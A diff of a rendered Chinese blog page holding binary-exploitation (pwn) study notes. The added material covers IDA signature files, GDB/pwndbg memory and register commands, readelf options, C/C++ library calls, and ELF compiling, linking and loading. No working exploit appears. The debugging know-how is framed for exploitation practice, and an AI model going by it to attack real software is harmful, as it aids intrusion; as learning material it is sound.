@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 80 分钟
+                    阅读时长: 86 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    39701 字
+                    42831 字
                 </time>
             </div>
         
@@ -775,6 +775,7 @@
 <p>IDA虚拟地址的偏移很可能不可靠</p>
 <p>显示机器码：<code>Options &gt; General &gt; Number of opcode bytes &gt; 10</code></p>
 <p>字符串不连接在一起，使用<code>Edit</code> &gt; <code>Export data</code> 选择如何导出</p>
+<p>粉色函数表明：外部函数，生成在<code>extern</code>段中</p>
 <p><strong>单键</strong></p>
 <ul>
 <li>对变量按<code>n</code>重命名，<code>/</code>添加注释</li>
@@ -782,6 +783,7 @@
 <li>按<code>y</code>可以看到函数及变量声明，可以<strong>修改参数、数据类型</strong>，<code>u</code>可以<code>undefine</code>函数，<code>p</code>将代码分析为函数</li>
 <li><code>r</code>可以将数字转为字符，<code>h</code>还原为数字，<code>u</code>还原为原数据</li>
 <li><code>g</code>输入地址可直接跳转，<code>c</code>让某一个位置变为指令</li>
+<li><code>tab</code>键切换汇编和反编译图</li>
 </ul>
 <p><strong>右键</strong></p>
 <ul>
@@ -800,7 +802,22 @@
 <p><code>ctrl + s</code>：段信息</p>
 </li>
 </ul>
-<p><strong>结构体</strong>直接创建分析：</p>
+<p><strong>补充符号表</strong>：制作签名文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo cp /lib/x86_64-linux-gnu/libc.a . <span class="c1"># 放入Flair工具文件夹中</span>
+</span></span><span class="line"><span class="cl">./pelf libc.a libc-2.XX.pat <span class="c1"># 生成libc-2.XX.exc中删除注释自动处理冲突</span>
+</span></span><span class="line"><span class="cl">./sigmake ./libc-2.XX.pat libc-2.XX.sig <span class="c1"># 放入IDA sig目录 pc下 </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># IDA: View &gt; Open subviews &gt; Signatures &gt; 右键 &gt; Apply new signature...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>结构体</strong>直接创建分析：</p>
 <ul>
 <li><code>View</code> &gt; <code>Open subviews</code> &gt; <code>Local types</code> or <code>shift + F1</code></li>
 <li><code>右键</code> &gt; <code>Insert</code> or <code>ins键</code></li>
@@ -1209,6 +1226,16 @@
 </span><span class="lnt">76
 </span><span class="lnt">77
 </span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1">#下断点</span>
@@ -1224,6 +1251,8 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 断在函数下，先调试找到 call malloc@plt 的地址，再下断点</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">args</span> <span class="mi">1</span> <span class="mi">2</span> <span class="mi">3</span> <span class="mi">4</span> <span class="c1"># 设置参数</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="o">*</span><span class="p">(</span><span class="n">unsigned</span> <span class="n">long</span> <span class="n">long</span><span class="o">*</span> <span class="p">)</span><span class="n">address</span> <span class="o">=</span> <span class="n">xx</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="err">$</span><span class="n">rax</span> <span class="o">=</span> <span class="n">xx</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">start</span> <span class="c1">#进入入口</span>
 </span></span><span class="line"><span class="cl">
@@ -1244,6 +1273,8 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="c1">#继续 从断点到另一个断点</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">u</span> <span class="mh">0xabc</span> <span class="c1"># 显示汇编码</span>
+</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">backtrace</span> <span class="c1"># bt显示函数调用关系</span>
 </span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="c1"># 从函数出来</span>
 </span></span><span class="line"><span class="cl">
@@ -1258,6 +1289,9 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#打印</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="n">符号</span> 					<span class="c1"># 打印符号的值, 如: ptr指针指向的值</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="n">变量</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">array_var</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="n">system</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">&amp;</span><span class="n">printf</span> 		 		 <span class="c1"># printf函数的地址</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="o">*</span><span class="p">(</span><span class="n">long</span> <span class="o">*</span><span class="p">)(</span><span class="err">$</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span> <span class="c1"># 查看rbp-0x40地址处的值，十六进制形式</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">/</span><span class="n">d</span> <span class="err">$</span><span class="n">rsp</span> 				 <span class="c1"># 查看rsp寄存器中的值，十进制形式</span>
@@ -1280,7 +1314,10 @@
 </span></span><span class="line"><span class="cl"><span class="n">stack</span> <span class="n">xxx</span> <span class="c1"># esp 和 ebp 之间的是当前执行的函数的栈帧，ebp 指向的是前一个函数的 ebp 的值</span>
 </span></span><span class="line"><span class="cl"><span class="mh">0xffff</span> <span class="err">→</span> <span class="mh">0xfffc</span> <span class="err">←</span> <span class="s1">&#39;aaa&#39;</span> <span class="c1"># 表示0xffff地址处存放着一个指针，指针指向&#39;aaa&#39;</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">telescope</span> <span class="n">address</span> <span class="c1"># 类似看栈的方式查看内存</span>
+</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">vmmap</span> <span class="c1">#获取调试进程中节的虚拟映射地址范围, 可见到内存中的动态链接库区域</span>
+</span></span><span class="line"><span class="cl"><span class="n">vmmap</span> <span class="mh">0xabc</span> <span class="c1"># 查看其在虚拟映射地址中位置</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="c1"># libc基址</span>
 </span></span><span class="line"><span class="cl"><span class="n">got</span>  <span class="c1"># 查看got表</span>
@@ -1294,15 +1331,16 @@
 </div><p><strong>查看内存：</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">x/nfu &lt;addr&gt;
@@ -1314,6 +1352,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">x/10gx address 	<span class="c1"># 一般</span>
 </span></span><span class="line"><span class="cl">x/20i func 		<span class="c1"># 查看函数反汇编代码</span>
+</span></span><span class="line"><span class="cl">x/80ga address <span class="c1"># 常用</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>exp动态调试</strong>：</p>
@@ -1553,9 +1592,17 @@
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">readelf -e xxx <span class="c1"># 分析ELF程序的工具，可以查看所有节头信息</span>
+</span></span><span class="line"><span class="cl">readelf -S xxx <span class="c1"># 节表</span>
+</span></span><span class="line"><span class="cl">readelf -l a.out <span class="c1"># 程序头表/段表 整理节表组成内存页, 且按权限分了类, 可以看到未运行文件大小和运行后内存大小</span>
+</span></span><span class="line"><span class="cl">readelf -r a.out <span class="c1"># 重定位表</span>
+</span></span><span class="line"><span class="cl">readelf -s a.out <span class="c1"># 符号表 主要链接和调试中使用, strip elf命令去掉后IDA分析只能分析出sub_XXXX</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>objdump</strong></p>
@@ -1716,7 +1763,6 @@
 </div>
 </div><h2 id="基础知识">基础知识</h2>
 <h3 id="计组">计组</h3>
-<p>虚拟内存mmap段中的动态链接库仅在物理内存中装载一份</p>
 <p><strong>CPU架构</strong></p>
 <ul>
 <li>
@@ -1900,21 +1946,27 @@
 </div><h3 id="c">C</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#pragma once </span><span class="c1">// 防止头文件被多次包含, 告诉编译器只包含该头文件一次
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;123456</span><span class="se">\r</span><span class="s">321</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> <span class="c1">// \r用于回到当前行的开头, \r后边的数字替代这一行最开始的相等数目的数字
 </span></span></span><span class="line"><span class="cl"><span class="c1">// output: 321456, 隐藏了123
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span> <span class="c1">// 换行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[2J</span><span class="se">\x1B</span><span class="s">[H&#34;</span><span class="p">);</span> <span class="c1">// x1B:ESC, [2J:清屏, [H:光标移至左上角
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="n">xxx</span><span class="p">;</span>    <span class="c1">//v1为空或无效
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span> <span class="n">xxx</span><span class="p">;</span>    <span class="c1">//v1为换行符，ASCII值为10
@@ -2036,6 +2088,12 @@
 </span><span class="lnt">14
 </span><span class="lnt">15
 </span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">strtol</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">endptr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">base</span><span class="p">);</span> <span class="c1">// 将str指向的字符数组转换为长整型
@@ -2054,6 +2112,12 @@
 </span></span><span class="line"><span class="cl"><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> <span class="c1">// 当传入+或-时会跳过scanf不改变该数组中的值
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="n">strcmp</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span> <span class="c1">// 注意观察值可能在某处可泄露
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>      <span class="c1">// 字符串长度，直到空字符，不包含\0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span> <span class="c1">// 将a字符串按&#34; &#34;分割返回第一个子字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">__path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">__argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">__envp</span><span class="p">[]);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// glibc包装了execl(),execlp(),execle(),execv(),execvp()5个exec API, 参数区别, 最终还是execve()
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>mmap</strong></p>
@@ -2089,7 +2153,82 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="n">mapped</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">sb</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="python">Python</h3>
+</div><h3 id="c-1">C++</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">vptr</span> <span class="o">=</span> <span class="k">operator</span> <span class="k">new</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">size_t</span> <span class="n">size</span><span class="p">);</span> <span class="c1">// 不调用构造函数，仅分配内存空间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">::</span><span class="n">basic_string</span><span class="p">(</span><span class="n">input</span><span class="p">);</span> <span class="c1">// 将input初始化为string对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">xxx</span><span class="p">);</span> <span class="c1">// 写入ostream
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>文件</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">std</span><span class="o">::</span><span class="n">ofstream</span><span class="o">::</span><span class="n">basic_ofstream</span><span class="p">();</span>  <span class="c1">// 创建文件输出流, 写入文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">std</span><span class="o">::</span><span class="n">ofstream</span><span class="o">::</span><span class="n">is_open</span><span class="p">(</span><span class="s">&#34;xxx&#34;</span><span class="p">);</span> <span class="c1">// 判断是否打开文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">std</span><span class="o">::</span><span class="n">ifstream</span><span class="o">::</span><span class="n">basic_ifstream</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="s">&#34;xx&#34;</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">);</span> <span class="c1">// 打开文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">ifstream</span><span class="o">::</span><span class="n">is_open</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="p">)</span> <span class="c1">// 判断是否打开
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">std</span><span class="o">::</span><span class="n">istream</span><span class="o">::</span><span class="k">operator</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span> <span class="c1">// 将文件内容读取到内存地址a中
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>虚函数</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="c1">// 虚函数占用类A对象内存空间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// void *vptr; // 虚函数表指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">virtual</span> <span class="kt">void</span> <span class="n">vfunc</span><span class="p">(){}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">virtual</span> <span class="o">~</span><span class="n">A</span><span class="p">(){}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">A</span><span class="o">::</span><span class="n">vftable</span><span class="p">;</span> <span class="c1">// 编译阶段自动为构造函数加入, 使vptr指向类A的虚函数表virtual table
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">private</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/pwn_note.zh-cn.assets/image-20241030225430193.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241030225430193"
+	
+	
+></p>
+<h3 id="python">Python</h3>
 <p><strong>小的匿名函数</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2350,7 +2489,7 @@
 	
 	
 ></p>
-<p><strong>段（segment）与节（section）</strong></p>
+<p><strong>段（segment）与节（section)</strong></p>
 <ol>
 <li>段用于进程的内存区域的rwx权限划分</li>
 <li>节用于ELF文件编译链接时与在磁盘上存储时的文件结构的组织</li>
@@ -2369,11 +2508,11 @@
 </li>
 <li>数据段 Data Segment 包含可读可写数据
 <ul>
-<li><code>.data</code>节：已初始化的全局变量</li>
+<li><code>.data</code>节：已初始化的全局变量，占用文件实际内存空间</li>
 <li><code>.dynamic</code>节</li>
 <li><code>.got</code>节</li>
 <li><code>.got.plt</code>节</li>
-<li><code>.bss</code>节：（Block Started by Symbol）未初始化的全局变量，不占用实际内存空间</li>
+<li><code>.bss</code>节：（Block Started by Symbol）未初始化的全局变量，不占用文件实际内存空间，运行才分配</li>
 </ul>
 </li>
 <li>栈段 Stack Segment
@@ -2402,8 +2541,151 @@
 </ol>
 </li>
 </ol>
-<h2 id="进程执行">进程执行</h2>
-<p><strong>静态链接</strong></p>
+<h2 id="进程">进程</h2>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20241029142856545.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241029142856545"
+	
+	
+></p>
+<h3 id="编译">编译</h3>
+<p>广义编译包括：</p>
+<ul>
+<li>
+<p><strong>预处理/预编译</strong>：处理<code>#</code> 开始的预编译指令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -E hello.c -o hello.i <span class="c1"># C++中.cpp/.cxx/.hpp预编译为.ii</span>
+</span></span><span class="line"><span class="cl">cpp hello.c &gt; hello.i
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>删除<code>#define</code>，展开所有宏定义</p>
+</li>
+<li>
+<p>处理条件预编译指令<code>#if, #ifdef, #elif, #else, #endif</code></p>
+</li>
+<li>
+<p>处理<code>#include</code>，将被包含文件递归插入到该位置</p>
+</li>
+<li>
+<p>删除所有注释<code>//, /* */</code></p>
+</li>
+<li>
+<p>添加行号和文件名标识，保留所有<code>#pragma</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>编译</strong>：将预处理后文件进行<strong>词法分析、语法分析、语义分析、优化</strong>后产生汇编代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -S hello.i -o hello.s -masm<span class="o">=</span>intel <span class="c1"># 指定汇编风格</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>汇编</strong>：汇编代码转换为机器码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">as hello.s -o hello.o
+</span></span><span class="line"><span class="cl">gcc -c hello.c -o hello.o <span class="c1"># 可重定位文件/目标文件</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h3 id="链接">链接</h3>
+<p>将多个目标文件及库文件生成最终可执行文件或共享库</p>
+<p><img src="/img/pwn_note.zh-cn.assets/-172844297857414.assets"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+></p>
+<h4 id="静态链接">静态链接</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld a.o b.o -o ab
+</span></span><span class="line"><span class="cl">gcc a.o b.o -o out.elf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>合并代码和数据段</strong></p>
+<p>多个目标文件中代码段和数据段合并成一个</p>
+<p><strong>符号解析</strong></p>
+<ul>
+<li>链接器通过<strong>重定位表</strong>解析目标文件中包含的对其他目标文件或库中定义的符号引用，修复对应机器码</li>
+<li>需要重定位的ELF都有对应重定位段，<code>.text</code>有<code>.rel.text</code>，<code>.data</code>有<code>.rel.data</code></li>
+<li>通过<code>Elf32_Rel</code>：
+<ul>
+<li>``r_offset`加上段起始得到<strong>重定位入口位置</strong></li>
+<li><code>r_info</code>低8位得<strong>重定位类型</strong></li>
+<li><code>r_info</code>高24位得到重定位符号在符号表<code>.symtab</code>中的<strong>下标</strong></li>
+</ul>
+</li>
+</ul>
+<p><strong>符号重定位</strong></p>
+<ul>
+<li><code>Elf32_Rel</code>中<code>st_value</code>表示符号在段中偏移，根据重定位类型计算入口需要修正的值并修正</li>
+<li>32位常用<strong>重定位类型</strong>：
+<ul>
+<li><code>R_386_32</code>：绝对地址</li>
+<li><code>R_386_PC32</code>：相对当前指令地址的下一条指令相对地址</li>
+</ul>
+</li>
+</ul>
+<p><strong>解析库依赖关系</strong></p>
+<p>目标文件依赖于外部库（标准/第三方），将所需的库文件链接到最终可执行文件中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/lib/x86_64-linux-gnu/libc.a <span class="c1"># 包含多个.o文件</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>生成重定位表</strong></p>
+<p>每次程序地址加载变化，需要生成重定位表，以便在可执行文件在加载和执行时进行正确的符号重定位</p>
+<h3 id="装载">装载</h3>
+<ol>
+<li>输入<code>./elf</code>，用户层bash进程调用<code>fork()</code>系统调用创建新进程，新进程调用<code>execve()</code>系统调用执行elf文件，以全新程序替代当前运行程序；原先bash进程返回等待新进程结束后，继续等待用户命令</li>
+<li>内核开始装载，<code>execve()</code>对应入口是<code>sys_execve()</code>检查参数</li>
+<li>调用<code>do_execve()</code>查找被执行文件，找到后读取前128字节判断文件格式，头4个字节为魔数：ELF头<code>x7felf</code>，Java可执行文件头<code>cafe</code>，Shell/python等解释型语言第一行<code>#!/bin/sh</code>或<code>#!/usr/bin/python</code></li>
+<li>调用<code>search_binary_handle</code>搜索匹配合适可执行文件<strong>装载处理过程</strong>并调用：<code>ELF</code>可执行文件对应<code>load_elf_binary()</code>，<code>a.out</code>可执行文件对应<code>load_aout_binary</code>，可执行脚本程序对应<code>load_script</code>
+<ul>
+<li>检查ELF文件格式有效性：魔数、段数量</li>
+<li>找动态链接的<code>.interp</code>段设置动态链接器路径</li>
+<li>根据程序头表，对ELF进行映射：代码、数据、只读数据</li>
+<li>初始化进程环境</li>
+<li>系统调用返回地址修改为ELF入口地址【<strong>静态链接</strong>入口是文件头<code>e_entry</code>所指地址；<strong>动态链接</strong>入口是<strong>动态链接器</strong>】</li>
+</ul>
+</li>
+<li><code>load_XX</code>函数执行完毕返回最初<code>sys_execve()</code>返回用户态，EIP寄存器跳转到ELF程序入口地址，执行新程序</li>
+</ol>
+<h3 id="执行">执行</h3>
 <p><img src="/img/pwn_note.zh-cn.assets/-172844297857412.assets"
 	
 	
@@ -2414,18 +2696,7 @@
 	
 	
 ></p>
-<p><strong>动态链接</strong></p>
 <p><img src="/img/pwn_note.zh-cn.assets/-172844297857413.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<p><img src="/img/pwn_note.zh-cn.assets/-172844297857414.assets"
 	
 	
 	
@@ -2477,6 +2748,13 @@
 </ol>
 </li>
 </ol>
+<h3 id="虚拟空间">虚拟空间</h3>
+<p>虚拟内存mmap段中的动态链接库仅在物理内存中装载一份</p>
+<ul>
+<li>每个进程有自己虚拟地址空间，由连续虚拟地址组成，不直接访问物理内存地址}</li>
+<li>OS将其分为多个区域【代码段：可执行程序机器指令；数据段：静态及全局变量<code>.bss .data ...</code>；动态链接段】</li>
